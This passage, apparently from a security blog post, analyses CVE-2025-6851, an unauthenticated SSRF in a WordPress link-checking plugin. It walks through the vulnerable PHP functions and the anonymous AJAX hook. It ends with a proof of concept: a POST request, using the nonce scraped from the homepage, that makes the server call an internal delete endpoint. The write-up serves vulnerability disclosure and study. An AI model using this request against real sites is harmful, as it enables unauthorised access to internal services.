attacks.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function check_url_status_code( $url, $timeout = null ) {&#xA;    // Get the &amp;#39;allow_redirects&amp;#39; option and sanitize it&#xA;    $allow_redirects = filter_var( get_option( &amp;#39;blnotifier_allow_redirects&amp;#39; ), FILTER_VALIDATE_BOOLEAN );&#xA;&#xA;    // Determine the request method based on allow_redirects option&#xA;    $request_method = $allow_redirects ? &amp;#39;GET&amp;#39; : &amp;#39;HEAD&amp;#39;;&#xA;&#xA;    // Force giving head for images, videos, and audio files&#xA;    if ( $request_method == &amp;#39;GET&amp;#39; ) {&#xA;        $file_extension = strtolower( pathinfo( $url, PATHINFO_EXTENSION ) );&#xA;        if ( in_array( $file_extension, $this-&amp;gt;get_force_head_file_types() ) ) {&#xA;            $request_method = &amp;#39;HEAD&amp;#39;;&#xA;        }&#xA;    }&#xA;    &#xA;    // User agent&#xA;    $user_agent = $this-&amp;gt;get_user_agent( $url );&#xA;&#xA;    // Add the home url&#xA;    if ( str_starts_with( $url, &amp;#39;/&amp;#39; ) ) {&#xA;        $link = home_url().$url;&#xA;    } else {&#xA;        $link = $url;&#xA;    }&#xA;&#xA;    // Check if from youtube&#xA;    if ( $watch_url = $this-&amp;gt;is_youtube_link( $link ) ) {&#xA;        $link = &amp;#39;https://www.youtube.com/oembed?format=json&amp;amp;url=&amp;#39;.$watch_url;&#xA;    }&#xA;&#xA;    // The request args&#xA;    // See https://developer.wordpress.org/reference/classes/WP_Http/request/&#xA;    $http_request_args = apply_filters( &amp;#39;blnotifier_http_request_args&amp;#39;, [&#xA;        &amp;#39;method&amp;#39;      =&amp;gt; $request_method,&#xA;        &amp;#39;timeout&amp;#39;     =&amp;gt; $timeout,&#xA;        &amp;#39;redirection&amp;#39; =&amp;gt; absint( get_option( &amp;#39;blnotifier_max_redirects&amp;#39;, 5 ) ),&#xA;        &amp;#39;httpversion&amp;#39; =&amp;gt; &amp;#39;1.1&amp;#39;,&#xA;        &amp;#39;sslverify&amp;#39;   =&amp;gt; filter_var( get_option( &amp;#39;blnotifier_ssl_verify&amp;#39;, true ), FILTER_VALIDATE_BOOLEAN ),&#xA;        &amp;#39;user-agent&amp;#39;  =&amp;gt; $user_agent&#xA;    ], $url );&#xA;&#xA;    // Check the link&#xA;    $response = wp_remote_get( $link, $http_request_args );&#xA;    if ( !is_wp_error( $response ) ) {&#xA;        $code = wp_remote_retrieve_response_code( $response );    &#xA;        $error = &amp;#39;Unknown&amp;#39;;&#xA;    } else {&#xA;        $code = 0;&#xA;        $error = $response-&amp;gt;get_error_message();&#xA;    }&#xA;&#xA;    // Let&amp;#39;s make invalid URL 0 codes broken&#xA;    if ( $code === 0 &amp;amp;&amp;amp; ( $error == &amp;#39;A valid URL was not provided.&amp;#39; || strpos( $error, &amp;#39;cURL error 6: Could not resolve host&amp;#39; ) !== false ) ) {&#xA;        $code = 666;&#xA;    }&#xA;&#xA;    // Possible Codes&#xA;    $codes = $this-&amp;gt;get_status_codes();&#xA;&#xA;    // Files too large&#xA;    if ( $request_method == &amp;#39;GET&amp;#39; ) {&#xA;        $content_length = wp_remote_retrieve_header( $response, &amp;#39;content-length&amp;#39; );&#xA;        if ( $content_length &amp;amp;&amp;amp; $content_length &amp;gt; 10 * 1024 * 1024 ) { // 10 MB&#xA;            $code = 413;&#xA;        }&#xA;    }&#xA;    &#xA;    // Bad links&#xA;    if ( in_array( $code, $this-&amp;gt;get_bad_status_codes() ) ) {&#xA;        $type = &amp;#39;broken&amp;#39;;&#xA;&#xA;    // Warnings&#xA;    } elseif ( in_array( $code, $this-&amp;gt;get_warning_status_codes() ) ) {&#xA;        $type = &amp;#39;warning&amp;#39;;&#xA;&#xA;    // Good links&#xA;    } else {&#xA;        $type = &amp;#39;good&amp;#39;;&#xA;    }&#xA;&#xA;    // Filter status&#xA;    $status = apply_filters( &amp;#39;blnotifier_status&amp;#39;, [&#xA;        &amp;#39;type&amp;#39; =&amp;gt; $type,&#xA;        &amp;#39;code&amp;#39; =&amp;gt; $code,&#xA;        &amp;#39;text&amp;#39; =&amp;gt; ( $code !== 0 &amp;amp;&amp;amp; ( isset( $codes[ $code ] ) &amp;amp;&amp;amp; $codes[ $code ][ &amp;#39;msg&amp;#39; ] != &amp;#39;&amp;#39; ) ) ? $codes[ $code ][ &amp;#39;msg&amp;#39; ] : $error,&#xA;        &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;    ] );&#xA;&#xA;    // Return the array&#xA;    return $status;&#xA;} // End check_url_status_code&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;check_url_status_code()&lt;/code&gt; function is responsible for &lt;strong&gt;checking the status of a URL&lt;/strong&gt; and classifying it as &lt;strong&gt;good, warning, or broken&lt;/strong&gt;. Specifically, the function performs the following main steps:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Retrieve configuration options&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Get the &lt;code&gt;blnotifier_allow_redirects&lt;/code&gt; option from the database and convert it to boolean → Decide whether to use &lt;strong&gt;GET&lt;/strong&gt; or &lt;strong&gt;HEAD&lt;/strong&gt; for the request.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Choose request method&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;If &lt;code&gt;allow_redirects = true&lt;/code&gt;, default to &lt;strong&gt;GET&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If the URL is a &lt;strong&gt;media file&lt;/strong&gt; (image, video, audio), the function forces &lt;strong&gt;HEAD&lt;/strong&gt; to avoid downloading large files.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Determine user-agent&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Calls &lt;code&gt;$this-&amp;gt;get_user_agent()&lt;/code&gt; to get an appropriate user-agent for the request.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Normalize the URL&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;If the URL starts with &lt;code&gt;/&lt;/code&gt; → prepend &lt;code&gt;home_url()&lt;/code&gt; to form an absolute URL.&lt;/li&gt;&#xA;&lt;li&gt;If the URL is a &lt;strong&gt;YouTube link&lt;/strong&gt;, convert it to the &lt;code&gt;oembed&lt;/code&gt; endpoint to obtain information safely without accessing the video directly.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Configure the request:&#xA;Build the &lt;code&gt;$http_request_args&lt;/code&gt; array containing request parameters:&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;method&lt;/code&gt; (GET/HEAD)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;timeout&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;redirection&lt;/code&gt; (max number of redirects)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;sslverify&lt;/code&gt; (whether to verify SSL)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;user-agent&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Perform the request&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Call &lt;code&gt;wp_remote_get($link, $http_request_args)&lt;/code&gt; to obtain the response.&lt;/li&gt;&#xA;&lt;li&gt;If no error → retrieve the &lt;strong&gt;status code&lt;/strong&gt; from the server.&lt;/li&gt;&#xA;&lt;li&gt;If error → retrieve the error message.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Handle invalid URLs&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Some basic errors such as invalid URL provided or host not resolvable → assign special code &lt;code&gt;666&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Handle oversized files&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;If request method is GET and &lt;strong&gt;content-length &amp;gt; 10MB&lt;/strong&gt;, assign code &lt;code&gt;413&lt;/code&gt; (Payload Too Large).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Classify result based on returned code:&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;broken&lt;/code&gt; → broken URL&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;warning&lt;/code&gt; → warning URL&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;good&lt;/code&gt; → valid URL&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;10&#34;&gt;&#xA;&lt;li&gt;Return result: Create the &lt;code&gt;$status&lt;/code&gt; array including:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;type&lt;/code&gt; → URL type (&lt;code&gt;good/warning/broken&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;code&lt;/code&gt; → HTTP code or special code&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;text&lt;/code&gt; → message (message from codes array or error)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;link&lt;/code&gt; → original URL&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Finally, return this array for the plugin to use to display the URL status.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;This function only sends a request to the URL and returns the URL status, it does not retrieve or return the file content. The SSRF issue arises when an attacker provides a URL pointing to internal services — the server will perform the request on behalf of the attacker, which can cause actions such as modifying data, deleting data, scanning/internal port checking, or calling sensitive endpoints. The function does not allow reading the returned file body directly, but performing requests to internal services alone can be harmful.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;&lt;code&gt;check_url_status_code()&lt;/code&gt; is called inside &lt;code&gt;check_link()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function check_link( $link ) {&#xA;    ...&#xA;    // Handle the filtered link if false&#xA;    if ( !$link ) {&#xA;    ...&#xA;    } elseif ( str_starts_with( $link, home_url() ) || ( str_starts_with( $link, &amp;#39;/&amp;#39; ) &amp;amp;&amp;amp; !str_starts_with( $link, &amp;#39;//&amp;#39; ) ) ) {&#xA;        &#xA;        // Check locally first&#xA;        if ( !url_to_postid( $link ) ) {                &#xA;&#xA;            // It may be redirected or an archive page, so let&amp;#39;s check status anyway&#xA;            // return $this-&amp;gt;check_url_status_code( $link );&#xA;            $status = $this-&amp;gt;check_url_status_code( $link );&#xA;            $CACHE-&amp;gt;set_cached_link( $status );&#xA;            return $status;&#xA;        }&#xA;    // Otherwise&#xA;    } else {&#xA;        // Skip url schemes&#xA;        foreach ( $this-&amp;gt;get_url_schemes() as $scheme ) {&#xA;            if ( str_starts_with( $link, $scheme.&amp;#39;:&amp;#39; ) ) {&#xA;                $status[ &amp;#39;text&amp;#39; ] = &amp;#39;Skipping: Non-Http URL Schema&amp;#39;;&#xA;                return $status;&#xA;            }&#xA;        }&#xA;&#xA;        // Return the status&#xA;        // return $this-&amp;gt;check_url_status_code( $link );&#xA;        $status = $this-&amp;gt;check_url_status_code( $link );&#xA;        $CACHE-&amp;gt;set_cached_link( $status );&#xA;        return $status;&#xA;    }&#xA;&#xA;    // Return the good status&#xA;    return $status;&#xA;} // End check_link()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;check_link()&lt;/code&gt; validates the URL before calling &lt;code&gt;check_url_status_code()&lt;/code&gt;. If the link is internal but doesn&amp;rsquo;t point to a valid post (&lt;code&gt;elseif&lt;/code&gt;), or is an external link (&lt;code&gt;else&lt;/code&gt;), the function will call &lt;code&gt;check_url_status_code()&lt;/code&gt; to obtain the status (&lt;code&gt;good&lt;/code&gt;, &lt;code&gt;warning&lt;/code&gt;, &lt;code&gt;broken&lt;/code&gt;) and cache it. Empty, invalid, or unsupported-scheme links are skipped and no request is sent.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;check_link()&lt;/code&gt; is called inside &lt;code&gt;ajax_blinks()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_blinks() {&#xA;    // Verify nonce&#xA;    if ( !isset( $_REQUEST[ &amp;#39;nonce&amp;#39; ] ) || !wp_verify_nonce( sanitize_text_field( wp_unslash( $_REQUEST[ &amp;#39;nonce&amp;#39; ] ) ), $this-&amp;gt;nonce_blinks ) ) {&#xA;        exit( &amp;#39;No naughty business please.&amp;#39; );&#xA;    }&#xA;&#xA;    // Get the ID&#xA;    $source_url    = isset( $_REQUEST[ &amp;#39;source_url&amp;#39; ] ) ? filter_var( wp_unslash( $_REQUEST[ &amp;#39;source_url&amp;#39; ] ), FILTER_SANITIZE_URL ) : &amp;#39;&amp;#39;;&#xA;    $header_links  = isset( $_REQUEST[ &amp;#39;header_links&amp;#39; ] ) ? wp_unslash( $_REQUEST[ &amp;#39;header_links&amp;#39; ] ) : []; // phpcs:ignore WordPress.Security.&#xA;    ...&#xA;&#xA;    // Make sure we have a source URL&#xA;    if ( $source_url ) {&#xA;&#xA;        // Only allow webpages, not file:///, etc.&#xA;        if ( !str_starts_with( $source_url, &amp;#39;http&amp;#39; ) ) {&#xA;            wp_send_json_error( &amp;#39;Invalid source: &amp;#39; . $source_url );&#xA;        }&#xA;&#xA;        // Header links&#xA;        if ( !empty( $header_links ) ) {&#xA;            foreach ( $header_links as &amp;amp;$header_link ) {&#xA;                $count_links&amp;#43;&amp;#43;;&#xA;                $header_link = $HELPERS-&amp;gt;sanitize_link( $header_link );&#xA;                $status = $HELPERS-&amp;gt;check_link( $header_link );&#xA;                if ( in_array( $status[ &amp;#39;code&amp;#39; ], $notify_status_codes ) ) {&#xA;                    $count_notify&amp;#43;&amp;#43;;&#xA;                    $notify[ &amp;#39;header&amp;#39; ][] = $status;&#xA;                } else {&#xA;                    $good_links[ &amp;#39;header&amp;#39; ][] = $status;&#xA;                }&#xA;            }&#xA;        }&#xA;        ...&#xA;    } &#xA;    ...&#xA;} // End ajax_blinks()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function is registered as a callback for an action hook with the hook name &lt;code&gt;wp_ajax_nopriv_blnotifier_blinks&lt;/code&gt; for &lt;strong&gt;anonymous users&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private $ajax_key_blinks = &amp;#39;blnotifier_blinks&amp;#39;;&#xA;add_action( &amp;#39;wp_ajax_nopriv_&amp;#39;.$this-&amp;gt;ajax_key_blinks, [ $this, &amp;#39;ajax_blinks&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It then performs the following:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Check &lt;code&gt;nonce&lt;/code&gt; to prevent CSRF&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Because this hook is intended for &lt;strong&gt;anonymous users&lt;/strong&gt;, the &lt;code&gt;nonce&lt;/code&gt; will also appear in the homepage source code.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-28-cve-2025-6851/nonce.png&#34; title=&#34;Nonce in the returned page source&#34; data-thumbnail=&#34;/posts/2025-10-28-cve-2025-6851/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce in the returned page source&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-28-cve-2025-6851/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;439&#34; width=&#34;1543&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in the returned page source&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Read data from the request&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Retrieve &lt;code&gt;source_url&lt;/code&gt; and links from &lt;code&gt;header_links&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Only accept &lt;code&gt;source_url&lt;/code&gt; that starts with &lt;code&gt;http&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Iterate each &lt;code&gt;header_links&lt;/code&gt; item and call &lt;code&gt;check_link()&lt;/code&gt; to check status&#xA;&lt;code&gt;header_links&lt;/code&gt; is passed as an array: &lt;code&gt;header_link[0]=http://example.com&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph LR&#xA;A[Anonymous Client sends URL] --&amp;gt; B[ajax_blinks]&#xA;B --&amp;gt; C[check_link]&#xA;C --&amp;gt; D[check_url_status_code]&#xA;D --&amp;gt; E[wp_remote_get with user-supplied URL]&#xA;E --&amp;gt; F[Response from server]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a simple local service using Python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, request&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/delete&amp;#39;, methods=[&amp;#39;GET&amp;#39;])&#xA;def delete():&#xA;    file_id = request.args.get(&amp;#39;id&amp;#39;)&#xA;    if not file_id:&#xA;        return &amp;#34;No id provided&amp;#34;, 400&#xA;    print(f&amp;#34;delete it: {file_id}&amp;#34;)&#xA;    return f&amp;#34;Delete it: {file_id}&amp;#34;&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Visit the homepage and obtain the &lt;code&gt;nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Send a POST request to the endpoint&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;&#xA;action=blnotifier_blinks&amp;amp;nonce=87f4d1ef16&amp;amp;source_url=http://localhost:8001/&amp;amp;header_links[0]=http://127.0.0.1:8001/delete?id=1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-28-cve-2025-6851/result.png&#34; title=&#34;Successfully sent request to local service&#34; data-thumbnail=&#34;/posts/2025-10-28-cve-2025-6851/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Successfully sent request to local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-28-cve-2025-6851/result.png&#39; alt=&#34;Result&#34; height=&#34;269&#34; width=&#34;966&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Successfully sent request to local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 